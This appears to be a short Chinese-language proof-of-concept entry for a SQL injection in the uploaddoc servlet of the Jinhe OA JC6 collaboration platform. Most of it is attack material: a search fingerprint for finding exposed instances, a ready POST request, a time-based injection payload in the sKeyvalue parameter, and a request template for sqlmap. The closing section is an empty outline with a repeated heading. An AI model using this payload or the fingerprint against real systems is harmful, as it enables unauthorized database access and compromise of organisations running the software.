# 金和OAJC6uploaddoc存在sql注入

- **系统**：金和OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`web.body="JC6金和协同管理平台"`
- **请求**：`POST /jc6/servlet/uploaddoc HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 50`

**请求体 / payload**
```
key=readimage&sKeyvalue=1';WAITFOR DELAY '0:0:3'--

sqlmap
POST /jc6/servlet/uploaddoc HTTP/1.1
Host: {hostname}
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
key=readimage&sKeyvalue=1
```

**其他**
- 金和OA JC6 uploaddoc存在sql注入: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞简介
***
- 版本: * 金和OA